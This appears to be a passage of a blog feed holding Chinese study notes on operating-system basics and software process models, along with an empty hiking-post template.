<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a> (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之概述</title>
    <url>/2020/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<p>操作系统 系列文章链接🔗</p>
<p>操作系统之概述:</p>
<ol>
<li>OS 定义</li>
<li>OS 历史</li>
<li>OS 分类</li>
<li>计算机底层硬件一览</li>
<li>OS 中的基本概念</li>
<li>系统调用</li>
<li>OS 结构</li>
</ol>
<a id="more"></a>
<h1 id="操作系统-系列文章链接🔗"><a href="#操作系统-系列文章链接🔗" class="headerlink" title="操作系统 系列文章链接🔗"></a>操作系统 系列文章链接🔗</h1><ol>
<li>操作系统之概述 (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
<h1 id="操作系统之概述"><a href="#操作系统之概述" class="headerlink" title="操作系统之概述"></a>操作系统之概述</h1><p>本章将涉及: </p>
<ol>
<li>OS 定义</li>
<li>OS 历史</li>
<li>OS 分类</li>
<li>计算机底层硬件一览</li>
<li>OS 中的基本概念</li>
<li>系统调用</li>
<li>OS 结构</li>
</ol>
<p><em>本部分基础概念较多, 仅为应付考试, 中英混杂且不做过多解释.  <del>背就完事了</del></em> </p>
<h2 id="OS定义"><a href="#OS定义" class="headerlink" title="OS定义"></a>OS定义</h2><h3 id="计算机系统的组成部分"><a href="#计算机系统的组成部分" class="headerlink" title="计算机系统的组成部分"></a>计算机系统的组成部分</h3><p>A computer system consists of </p>
<ol>
<li>硬件 Hardware </li>
<li>系统程序 system programs</li>
<li>应用程序 application programs</li>
</ol>
<h3 id="操作系统扮演的角色"><a href="#操作系统扮演的角色" class="headerlink" title="操作系统扮演的角色"></a>操作系统扮演的角色</h3><ol>
<li>an extended machine (对于用户: 让用户更好地使用机器, 是硬件的包装接口) </li>
<li>a resource manager (对于机器: 告知机器如何分配硬件资源, 是用户的命令代理执行者, 也是资源的分配者)</li>
</ol>
<p>是 an intermediary(中间调解人) between a user of a computer and the computer hardware.</p>
<h3 id="Operating-system-goals"><a href="#Operating-system-goals" class="headerlink" title="Operating system goals"></a>Operating system goals</h3><ol>
<li>Execute user programs and make solving user problems <strong>easier</strong>. <strong>简单</strong></li>
<li>Make the computer system <strong>convenient</strong> to use. <strong>易用</strong></li>
<li>Use the computer hardware in an <strong>efficient</strong> manner. <strong>高效</strong></li>
<li>Permit effective development, testing, and introduction of new system functions without interfering with service. （<strong>易于扩充</strong>）</li>
</ol>
<h3 id="一些正确叙述"><a href="#一些正确叙述" class="headerlink" title="一些正确叙述"></a>一些正确叙述</h3><ul>
<li><p><strong>Resource allocator</strong> – manages and allocates resources. </p>
</li>
<li><p><strong>Control program</strong> – controls the execution of user programs and operations of I/O devices .</p>
</li>
<li><p><strong>Kernel</strong> – the one program running at all times (all else being application programs).</p>
<p>OS 是唯一运行在内核态的程序, 并且是全程运行, 并且先于其他程序运行</p>
</li>
<li><p>OS 与用户交互的界面: <strong>Shell</strong> : 文本交互; <strong>GUI</strong> : 图像交互</p>
</li>
<li><p>内核态中, OS对所有的硬件具有完全的访问权, 可以执行任何对于硬件的指令. 而用户级程序只能使用机器指令中的子集</p>
</li>
</ul>
<h2 id="OS历史"><a href="#OS历史" class="headerlink" title="OS历史"></a>OS历史</h2><p>根据计算机本身的发展而发展</p>
<ul>
<li><p>真空管, 穿孔卡</p>
</li>
<li><p>晶体管, 批处理程序</p>
</li>
<li><p>集成电路, 多道程序Multiprogramming        </p>
<p>多道程序: 在计算机中同时存放多个作业( 但不一定是绝对意义上的 <strong>同时</strong> 运行 详细请参看进程一章)</p>
</li>
<li><p>个人计算机</p>
</li>
<li><p>手持计算机</p>
</li>
</ul>
<h2 id="OS分类"><a href="#OS分类" class="headerlink" title="OS分类"></a>OS分类</h2><ul>
<li> Mainframe operating systems （大型机OS）</li>
<li> Server operating systems （服务器OS） </li>
<li> Multiprocessor operating systems （多处理机OS） </li>
<li> Personal computer operating systems （个人计算机OS）</li>
<li> Real-time operating systems （实时 OS） <ul>
<li>硬实时: <ul>
<li>辅助储存空间有限或不存在, 所有数据只在寄存器或只读存储器ROM中保存</li>
<li>例如: 导弹制动系统</li>
<li>由于不存在任何辅助储存空间, 因此与分时系统是冲突的</li>
</ul>
</li>
<li>软实时: <ul>
<li>部分关键实时任务的优先级高于其他任务，并保留该优先级直到完成为止</li>
<li>例如:  industrial control or robotics 以及 applications (多媒体 VR等) requiring  advanced operating system features.</li>
</ul>
</li>
</ul>
</li>
<li> Embedded operating systems （嵌入式OS）</li>
<li> Smart card operating systems （智能卡OS)</li>
</ul>
<h2 id="计算机底层硬件"><a href="#计算机底层硬件" class="headerlink" title="计算机底层硬件"></a>计算机底层硬件</h2><p>计算机包括这些硬件组成部分</p>
<ol>
<li>CPU </li>
<li>Main Memory</li>
<li>IO Module</li>
<li>System Bus</li>
<li>…</li>
</ol>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/toplevel.png" alt=""></p>
<h3 id="中央处理器"><a href="#中央处理器" class="headerlink" title="中央处理器"></a>中央处理器</h3><p>从内存中提取指令并执行它们。 </p>
<ul>
<li>每个CPU都有一组可以执行的特定指令 称为该CPU的指令集( 例如8086指令集)</li>
<li>因为访问内存以获取指令或数据字比执行一条指令要花费更长的时间，所以所有CPU都在其中包含一些寄存器来保存键变量和临时结果。</li>
</ul>
<h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><ul>
<li>中断是CPU 在工作中的必要操作, 能够使工作更加高效</li>
<li>An interruption of the normal sequence of execution  </li>
<li>例如等待IO的过程中执行别的进程, 在IO结束时产生中断回到原进程继续执行</li>
<li>运行 - 中断 - 恢复 - 运行</li>
<li>中断分类<ul>
<li>程序中断<ul>
<li>运算溢出</li>
<li>除零</li>
<li>页面失效</li>
<li>执行非法指令</li>
</ul>
</li>
<li>时钟中断<ul>
<li>程序片使用完毕</li>
</ul>
</li>
<li>IO 中断</li>
<li>硬件错误</li>
</ul>
</li>
</ul>
<h3 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h3><h4 id="存储层次结构"><a href="#存储层次结构" class="headerlink" title="存储层次结构"></a>存储层次结构</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/cache.png" alt=""></p>
<ul>
<li>每一级都是下一级的内容的子集</li>
<li>从上到下: 更大 更慢 更便宜</li>
</ul>
<p>详见内存管理章节</p>
<h4 id="DMA-直接存储器存取"><a href="#DMA-直接存储器存取" class="headerlink" title="DMA 直接存储器存取"></a>DMA 直接存储器存取</h4><p>Transfers a block of data directly to or from memory</p>
<p>可以在不经有CPU的情况下直接访问Data Bus, 用于进一步简化CPU等待时间</p>
<h4 id="基址-限址-MMU"><a href="#基址-限址-MMU" class="headerlink" title="基址 限址 MMU"></a>基址 限址 MMU</h4><ul>
<li>Base register and limit register 基址寄存器和限界寄存器</li>
<li>MMU (Memory Management Unit) 内存管理单元</li>
</ul>
<h3 id="IO设备"><a href="#IO设备" class="headerlink" title="IO设备"></a>IO设备</h3><p>IO设备实际上包括(控制器与设备本身) A controller and the device itself. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/device.png" alt=""></p>
<p>IO中断</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/io.png" alt=""></p>
<ul>
<li>(a) Steps in starting an I/O device and getting interrupt 设备如何发起中断 </li>
<li>(b) How the CPU is interrupted 中央处理器如何处理中断</li>
</ul>
<p>总线</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/bus.png" alt=""></p>
<h2 id="OS概念"><a href="#OS概念" class="headerlink" title="OS概念"></a>OS概念</h2><h3 id="程序管理相关"><a href="#程序管理相关" class="headerlink" title="程序管理相关"></a>程序管理相关</h3><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><ul>
<li>Process: a program in execution.</li>
</ul>
<h4 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h4><ul>
<li>Address space: a list of memory locations from some minimum to some maximum, which the process can read and write.</li>
</ul>
<h4 id="进程表"><a href="#进程表" class="headerlink" title="进程表"></a>进程表</h4><ul>
<li>Process table: where all the information about each process is stored in.</li>
</ul>
<h4 id="进程树"><a href="#进程树" class="headerlink" title="进程树"></a>进程树</h4><ul>
<li>process tree </li>
</ul>
<h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><ul>
<li>process is divided into threads that can run simultaneously </li>
<li>线程 Thread : <ul>
<li>CPU可分配的最基本单元</li>
<li>能够执行与中断</li>
</ul>
</li>
</ul>
<h4 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h4><ul>
<li>Inter-process communication<ul>
<li>Related processes that are cooperating to get some job done often need to communicate with one another and synchronize their activities.</li>
<li>为了完成某项工作而进行协作的相关流程通常需要彼此通信并同步其活动。</li>
</ul>
</li>
</ul>
<h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><ul>
<li>Deadlock: when two or more processes are interacting, they can sometimes get themselves into a stalemate (僵持) situation they cannot get out of.</li>
</ul>
<h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><ul>
<li>Pipe: a sort of pseudofile that used to connect two processes.</li>
</ul>
<h3 id="文件管理相关"><a href="#文件管理相关" class="headerlink" title="文件管理相关"></a>文件管理相关</h3><h4 id="设备无关性"><a href="#设备无关性" class="headerlink" title="设备无关性"></a>设备无关性</h4><p>操作系统的主要功能是隐藏磁盘和其他IO设备的特性，并为程序员提供一个与设备无关的文件的漂亮，简洁的抽象模型。<strong>设备无关性</strong> : device-independent</p>
<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
<li>Director: A place to keep files, a way of grouping files together. System calls are then needed to create and remove directories. </li>
</ul>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul>
<li><p>File system: Calls are also provided to put an existing file in a directory, and to remove a file from a directory. Directory entries may be either files or other directories.</p>
</li>
<li><p>挂载mount</p>
</li>
</ul>
<h3 id="架构相关"><a href="#架构相关" class="headerlink" title="架构相关"></a>架构相关</h3><h4 id="微内核"><a href="#微内核" class="headerlink" title="微内核"></a>微内核</h4><ul>
<li>Microkernel architecture （微内核结构）</li>
<li>assigns only a few essential functions to the kernel 只分配了最基本功能<ul>
<li>➢ address space </li>
<li>➢ inter-process communication (IPC)</li>
<li>➢ basic scheduling</li>
</ul>
</li>
</ul>
<h4 id="对称多处理"><a href="#对称多处理" class="headerlink" title="对称多处理"></a>对称多处理</h4><ul>
<li>Symmetric multiprocessing（对称多处理） <ul>
<li>there are multiple processors 多个处理器</li>
<li>these processors share same main memory and I/O facilities   共享主存与IO设备</li>
<li>All processors can perform the same functions  所有处理器可执行相同的功能</li>
</ul>
</li>
</ul>
<h4 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h4><ul>
<li>Distributed operating systems（分布）<ul>
<li>provides the illusion of a single main memory and single secondary memory space 虽然是分布式但是给人感觉像是单个主存单个辅助存储空间的错觉</li>
<li>used for distributed file system 常用于分布式文件系统</li>
</ul>
</li>
</ul>
<h4 id="面向对象设计"><a href="#面向对象设计" class="headerlink" title="面向对象设计"></a>面向对象设计</h4><ul>
<li>Object-oriented design（面向对象设计） <ul>
<li>used for adding modular extensions to a small kernel  用于向小内核添加模块化扩展</li>
<li>enables programmers to customize an operating system without disrupting system integrity 使程序员能够自定义操作系统，而不会破坏系统完整性</li>
</ul>
</li>
</ul>
<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><h3 id="系统调用的流程"><a href="#系统调用的流程" class="headerlink" title="系统调用的流程"></a>系统调用的流程</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/sys%20call.png" alt=""></p>
<p>系统调用需要11步来实现</p>
<p>以 <code>read (fd, buffer, nbytes)</code> 为例; 从 <code>fd</code> 文件向<code>buffer</code> 缓冲区中读入 <code>nbytes</code> 内容</p>
<ol>
<li>用户程序:  保存 <code>nbytes</code> 参数</li>
<li>用户程序:  保存 缓冲区地址 参数</li>
<li>用户程序:  保存 文件 参数</li>
<li>用户程序:  调用库函数中的代码</li>
<li>库程序:      将相关代码存入寄存器</li>
<li>陷入内核, 此时CPU的使用权转移至内核态</li>
<li>处理指令</li>
<li>读取数据</li>
<li>返回库程序</li>
<li>返回用户程序</li>
<li>用户程序:  SP++ 执行下一条指令</li>
</ol>
<h3 id="常见的系统调用"><a href="#常见的系统调用" class="headerlink" title="常见的系统调用"></a>常见的系统调用</h3><h4 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/unix1.png" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/unix2.png" alt=""></p>
<h4 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/win32.png" alt=""></p>
<h2 id="OS结构"><a href="#OS结构" class="headerlink" title="OS结构"></a>OS结构</h2><h3 id="单体系统"><a href="#单体系统" class="headerlink" title="单体系统"></a>单体系统</h3><ul>
<li>Monolithic system (单体系统): The structure is that there is <strong>no structure</strong>. </li>
<li>The OS is written as a collection of procedures, each of which can call any of the other ones whenever it needs to.操作系统是作为过程的集合编写的，每个过程都可以在需要时调用任何其他过程。</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/mono.png" alt=""></p>
<h3 id="分层系统"><a href="#分层系统" class="headerlink" title="分层系统"></a>分层系统</h3><ul>
<li>Layered system (分层系统): Organize the OS as a hierarchy of layers, each one constructed upon the one below it 层次结构，每个层次结构都基于其下一层</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/layer.png" alt=""></p>
<h3 id="微内核系统"><a href="#微内核系统" class="headerlink" title="微内核系统"></a>微内核系统</h3><ul>
<li>Microkernels (微内核结构): Put as little as possible in kernel model</li>
</ul>
<h3 id="Client-Server-Model"><a href="#Client-Server-Model" class="headerlink" title="Client-Server Model"></a>Client-Server Model</h3><ul>
<li>现代OS的趋势是: 采用<strong>将代码进一步移到更高层</strong>的想法，并尽可能<strong>从内核模式中删除</strong>，从而保留最小的微内核。</li>
<li>The client-server model, all the kernel does is handle the communication between clients and servers. 内核只负责处理客户端和服务器之间的通信。</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/CS%20Model.png" alt=""></p>
<h3 id="虚拟系统"><a href="#虚拟系统" class="headerlink" title="虚拟系统"></a>虚拟系统</h3><ul>
<li>Virtual Machines (虚拟机): 系统的核心被称为 <strong>虚拟机监视器</strong> virtual machine monitor直接运行在硬件层, 并且向下一层提供多个虚拟的机器</li>
<li>下图仅为虚拟化的一种实现方式, 详见多处理器系统章节</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E8%99%9A%E6%8B%9F%E5%8C%961.png" alt=""></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>山与水-漫步秦岭之太兴山</title>
    <url>/2020/09/02/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E5%A4%AA%E5%85%B4%E5%B1%B1/</url>
    <content><![CDATA[<p>2020年月日</p>
<h1 id="在这里简要概括路线"><a href="#在这里简要概括路线" class="headerlink" title="在这里简要概括路线"></a>在这里简要概括路线</h1><a id="more"></a>
<ul>
<li>山与水    | 游记<ul>
<li>不积硅步 | 徒步系列</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>山与水</category>
        <category>不积硅步</category>
      </categories>
      <tags>
        <tag>游记</tag>
        <tag>漫步秦岭##可选</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程概论之过程模型</title>
    <url>/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E4%B9%8B%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<ol>
<li>过程</li>
<li>软件过程模型<ol>
<li>瀑布模型    Waterfall model </li>
<li>V-模型  V model </li>
<li>原型模型 Prototyping model </li>
<li>阶段性开发：增量与迭代  Phased development:  increments and iteration </li>
<li>螺旋模型  Spiral model </li>
<li>敏捷开发 Agile methods</li>
</ol>
</li>
</ol>
<p><em>之前随便记的,千万别用来备考期末</em></p>
<a id="more"></a>
<h1 id="软件工程概论-第二章-过程模型与生命周期"><a href="#软件工程概论-第二章-过程模型与生命周期" class="headerlink" title="软件工程概论  第二章  过程模型与生命周期"></a>软件工程概论  第二章  过程模型与生命周期</h1><h2 id="2-1-过程-Meaning-of-Process"><a href="#2-1-过程-Meaning-of-Process" class="headerlink" title="2.1 过程     Meaning of  Process"></a>2.1 过程     Meaning of  Process</h2><p>软件开发不等于写课后题</p>
<ol>
<li>实际软件大而复杂</li>
<li>多人协作，需要及时沟通及对工程的共同理解</li>
</ol>
<h3 id="什么是过程？"><a href="#什么是过程？" class="headerlink" title="什么是过程？"></a>什么是过程？</h3><p> A process defines <strong>who</strong> is doing <strong>what, when</strong> and <strong>how</strong>, in order to reach a certain <strong>goal</strong>.</p>
<p>一组任务的集合。具体是包括：</p>
<ul>
<li>分工及workflow：谁去干什么？先干什么？后干什么？</li>
<li>产品：不止是最终交付的软件，还包括在过程中的某一环节生产出的各种文档、手册、代码etc</li>
<li>里程碑 Mailstones：如何标志一个环节结束？</li>
<li>。。。</li>
</ul>
<h3 id="使用过程的重要性"><a href="#使用过程的重要性" class="headerlink" title="使用过程的重要性"></a>使用过程的重要性</h3><ol>
<li>确保生产过程的一致性，以及对项目的整体结构的把握</li>
<li>指导如何理解项目、控制环节、检查成果。并改善上述活动</li>
<li>对同一类型（模型） 的生产过程积攒经验，并在下次处理同类问题时应用</li>
</ol>
<h3 id="综上，搭建过程模型的理由："><a href="#综上，搭建过程模型的理由：" class="headerlink" title="综上，搭建过程模型的理由："></a>综上，搭建过程模型的理由：</h3><ol>
<li>确保所有人对该项目有一个统一普遍的理解；</li>
<li>To find inconsistencies, redundancies, omissions （？？？）</li>
<li>确定合适的活动来实现其中每个阶段目标，并在时候对其进行评估；</li>
<li>对特定的、同类型的工程总结普遍的开发规律，并在日后开发时加以运用。</li>
</ol>
<h3 id="定义软件过程"><a href="#定义软件过程" class="headerlink" title="定义软件过程"></a>定义软件过程</h3><p>谁做什么，when，how，并且最终达到什么标准</p>
<p>生命周期是什么</p>
<p>图：软件开发中的多种阶段</p>
<h2 id="2-2-过程模型举例"><a href="#2-2-过程模型举例" class="headerlink" title="2.2 过程模型举例"></a>2.2 过程模型举例</h2><h3 id="2-2-1瀑布模型"><a href="#2-2-1瀑布模型" class="headerlink" title="2.2.1瀑布模型"></a>2.2.1瀑布模型</h3><p>严格地串行化过程。</p>
<ol>
<li>需求分析完全结束后，生成需求文档作为里程碑。</li>
<li>在需求文档基础上开始系统设计，生成功能分析表。</li>
<li>在功能分析表基础上开始程序设计，生成…….</li>
<li>…….编程</li>
<li>…….单元测试、集成测试</li>
<li>…….系统测试</li>
<li>…….验收测试 &amp; 交付</li>
<li>……维护与保养</li>
</ol>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583564856014.png" alt="瀑布模型"></p>
<h4 id="瀑布模型的特点"><a href="#瀑布模型的特点" class="headerlink" title="瀑布模型的特点"></a>瀑布模型的特点</h4><p>模型易于理解；后续环节完全基于上游环节；每一步严格地具有输入输出的产品/文档；对不同阶段的开发者定义为不同的角色。</p>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583637124830.png" alt="1583637124830"></p>
<h4 id="瀑布模型的问题"><a href="#瀑布模型的问题" class="headerlink" title="瀑布模型的问题"></a>瀑布模型的问题</h4><p>要求每一步都需要完全正确。该模型难以回溯至上层环节。</p>
<p>Where the waterfall model works fine?</p>
<ul>
<li>既定的程序和技术</li>
<li>不需要太多的需求变化</li>
<li>•组织良好、角色明确的项目</li>
<li>“可重复”项目</li>
<li>时间与资金预算充足的大型项目</li>
</ul>
<h3 id="2-2-2-原型模型-Prototyping"><a href="#2-2-2-原型模型-Prototyping" class="headerlink" title="2.2.2 原型模型 Prototyping"></a>2.2.2 原型模型 Prototyping</h3><p>迅速建造一个可以运行的软件原型 ，以便理解和澄清问题，使开发人员与用户达成共识，最终在确定的客户需求基础上开发客户满意的软件产品。在需求分析阶段对软件的需求进行初步而非完全的分析和定义，由用户提出修改和细节，最终再进行实现。<img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583637791886.png" alt="1583637791886"></p>
<h3 id="2-2-3-V-模型-V-mode"><a href="#2-2-3-V-模型-V-mode" class="headerlink" title="2.2.3 V-模型     V-mode"></a>2.2.3 V-模型     V-mode</h3><p>为了解决开发出的软件质量不高问题</p>
<p>核心：通过设置多次测试来保证软件的质量</p>
<p>单元测试、集成测试、系统测试、验收测试</p>
<p>每一步测试不通过时可以向上回溯。</p>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583567021149.png" alt="1583567021149"></p>
<h3 id="2-2-4-阶段性开发-Phased-development"><a href="#2-2-4-阶段性开发-Phased-development" class="headerlink" title="2.2.4 阶段性开发    Phased development:"></a>2.2.4 阶段性开发    Phased development:</h3><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><p>将整体的任务分解成多个小阶段，从而将工作量化简、并减少错误。</p>
<h4 id="递增开发，increments"><a href="#递增开发，increments" class="headerlink" title="递增开发，increments"></a>递增开发，increments</h4><p>由某一子系统开始开发，在每次版本更新时逐渐新增功能。</p>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583567710642.png" alt="1583567710642"></p>
<h4 id="迭代开发，-iterations"><a href="#迭代开发，-iterations" class="headerlink" title="迭代开发， iterations"></a>迭代开发， iterations</h4><p>由整个系统的测试版开始开发，每次更新完善其中的部分模块</p>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583567758762.png" alt="1583567758762"></p>
<h4 id="阶段性开发的优点"><a href="#阶段性开发的优点" class="headerlink" title="阶段性开发的优点"></a>阶段性开发的优点</h4><ul>
<li>产品可以提前发布，即使功能缺失或不完善</li>
<li>可以为以前从未提供过的功能提前创建市场</li>
<li>频繁的发布可以让开发人员快速、全面地解决未预料到的问题</li>
<li>开发团队可以通过不同的发布专注于不同的专业领域</li>
</ul>
<h3 id="2-2-5-螺旋开发-Spiral-model"><a href="#2-2-5-螺旋开发-Spiral-model" class="headerlink" title="2.2.5 螺旋开发    Spiral model"></a>2.2.5 螺旋开发    Spiral model</h3><ul>
<li>引入风险控制</li>
<li>开发呈现出围绕以下四个维度的螺旋式开发<ol>
<li>计划</li>
<li>定义目标、备选方案及限制</li>
<li>评估备选方案以及风险</li>
<li>开发与测试</li>
</ol>
</li>
</ul>
<p>特点：将与代码相关的内容压缩，大部分内容在开发研究</p>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583568162769.png" alt="1583568162769"></p>
<h3 id="2-2-6-混合开发-Hybrid-process-models"><a href="#2-2-6-混合开发-Hybrid-process-models" class="headerlink" title="2.2.6 混合开发 Hybrid process models"></a>2.2.6 混合开发 Hybrid process models</h3><p>过程模型有其优劣点与适用场景，不能一概而论。</p>
<p>下图为不同年代使用的不同开发模型，可见历史上所出现的所有软件工程模型都没有消亡过。（包括最初的瀑布模型）所以断言某一种模型比另外一种好是不可取的。事实上在实际工程项目中，各模型常常混合使用。</p>
<p><img src="C:\Users\seven\AppData\Roaming\Typora\typora-user-images\1583638636203.png" alt="1583638636203"></p>
<h3 id="2-2-7-敏捷开发-Agile-methods"><a href="#2-2-7-敏捷开发-Agile-methods" class="headerlink" title="2.2.7 敏捷开发 Agile methods"></a>2.2.7 敏捷开发 Agile methods</h3><p>2001年敏捷宣言 Agile manifesto</p>
<blockquote>
<ul>
<li>重视<strong>个人和交互</strong>，而不是过程和工具。</li>
</ul>
<p>value individuals and interactions over processes and tools</p>
<ul>
<li>更愿意花时间在<strong>生产工作软件</strong>上，而不是在生产全面的文档上</li>
</ul>
<p>invest time in producing working software rather than in producing comprehensive documentation</p>
<ul>
<li>专注于<strong>客户协作</strong>而不是合同谈判，从而使客户参与开发过程的关键方面</li>
</ul>
<p>focus on customer collaboration rather than contrast negotiation</p>
<ul>
<li>专注于<strong>响应变化</strong>而不是先制定计划然后再执行，因为无法事先预料所有情况</li>
</ul>
<p>concentrate on responding to change rather than on creating a plan and then following it</p>
</blockquote>
<p>敏捷开发包括多种方法体系，这里主要介绍两种：Extreme programming和S</p>
<h4 id="2-2-7-1-极限编程-Extreme-programming（简称XP）"><a href="#2-2-7-1-极限编程-Extreme-programming（简称XP）" class="headerlink" title="2.2.7.1 极限编程 Extreme programming（简称XP）"></a>2.2.7.1 极限编程 Extreme programming（简称XP）</h4><p>四大基本特征：</p>
<ol>
<li><p>Communication</p>
<p>所有成员要及时沟通。</p>
</li>
<li><p>Simplify</p>
<p>以用户要求为最高标准，不要画蛇添足；越复杂越易错。</p>
</li>
<li><p>Courage</p>
<p>承担责任。所有成员都有权修改任何代码（并承担所有责任）</p>
</li>
<li><p>Feedback</p>
<p>反馈。不断地与客户反馈，并保证反馈的问题被跟踪、完善、解决。</p>
</li>
</ol>
<h4 id="2-2-7-2-Scrum"><a href="#2-2-7-2-Scrum" class="headerlink" title="2.2.7.2 Scrum"></a>2.2.7.2 Scrum</h4><p>Scrum是一个包括了一系列的实践和预定义角色的过程骨架。</p>
<p>在每一次冲刺（一个15到30 天周期），开发团队创建可用的软件的一个增量。每一个冲刺所要实现的特性来自产品订单（product backlog，产品目标）哪些订单项（目标项目）会被加入一次冲刺，由冲刺计划会议决定。 </p>
<p>在会议中，产品负责人告诉开发团队他需要完成产品订单中的哪些订单项。开发团队决定在下一次冲刺中他们能够承诺完成多少订单项。 在冲刺的过程中，没有人能够变更冲刺订单（sprint backlog），即使用户需求发生了变化（称为“冻结”）。</p>
<p>在冲刺中，每一天都会举行项目状况会议，被称为“scrum”或“每日站立会议”。不论团队规模大小，会议被限制在15分钟。所有出席者都应站立或喝咖啡。（有助于保持会议简短）会议应在固定地点和每天的同一时间举行。在会议上，每个团队成员需要回答三个问题：</p>
<p>你完成了哪些工作？以后你打算做什么？完成你的目标是否存在什么障碍？</p>
